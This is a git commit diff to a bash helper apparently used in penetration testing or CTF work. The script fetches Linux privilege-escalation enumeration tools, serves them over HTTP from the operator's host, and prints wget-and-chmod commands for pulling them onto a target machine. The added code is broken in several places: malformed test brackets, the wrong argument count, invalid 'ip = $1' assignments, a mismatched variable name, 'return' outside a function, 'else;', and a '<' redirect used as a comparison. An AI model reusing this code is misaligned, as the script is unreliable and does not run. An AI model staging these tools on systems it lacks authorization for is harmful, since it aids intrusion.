8e11a13923787996d72205db93d297f12942f5c6
Peter Melniček <melnicek@outlook.com>
2020-09-22 14:05:12 +0200

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,5 +1,13 @@
 #!/bin/bash
 
+if [ $# != 3]; then
+  echo "Usage: #0 <LHOST> <LPORT>"
+  return 1
+fi
+
+ip = $1
+port = $2
+
 if [ ! -f "linpeas.sh" ]; then
   wget "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -O linpeas.sh
 fi
@@ -24,21 +32,26 @@ if [ ! -f "linuxprivchecker.py" ]; then
   wget "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py" -O linuxprivchecker.py
 fi
 
-ip=$(ip addr | grep tun0 | grep inet | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1)
+ipold=$(ip addr | grep tun0 | grep inet | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1)
 
-if [ ! $ip ]; then
-  ip=$(ip addr | grep eth0 | grep inet | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1)
+if [ ! $oldip ]; then
+  ipold=$(ip addr | grep eth0 | grep inet | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1)
 fi
 
 echo ""
 echo "You can download any of these tools to your target linux machine using commands below:"
 echo ""
-echo "wget http://$ip:8990/linpeas.sh; chmod +x linpeas.sh"
-echo "wget http://$ip:8990/suid3num.py; chmod +x suid3num.py"
-echo "wget http://$ip:8990/linenum.sh; chmod +x linenum.sh"
-echo "wget http://$ip:8990/lse.sh; chmod +x lse.sh"
-echo "wget http://$ip:8990/linux-exploit-suggester.sh; chmod +x linux-exploit-suggester.sh"
-echo "wget http://$ip:8990/linuxprivchecker.py; chmod +x linuxprivchecker.py"
+echo "wget http://$ip:$port/linpeas.sh; chmod +x linpeas.sh"
+echo "wget http://$ip:$port/suid3num.py; chmod +x suid3num.py"
+echo "wget http://$ip:$port/linenum.sh; chmod +x linenum.sh"
+echo "wget http://$ip:$port/lse.sh; chmod +x lse.sh"
+echo "wget http://$ip:$port/linux-exploit-suggester.sh; chmod +x linux-exploit-suggester.sh"
+echo "wget http://$ip:$port/linuxprivchecker.py; chmod +x linuxprivchecker.py"
 echo ""
 
-python3 -m http.server 8990
+if [ $port < 1024]; then
+  echo "Port is less than 1024, you need to provide your sudo password..."
+  sudo python3 -m http.server $port
+else;
+  python3 -m http.server $port
+fi
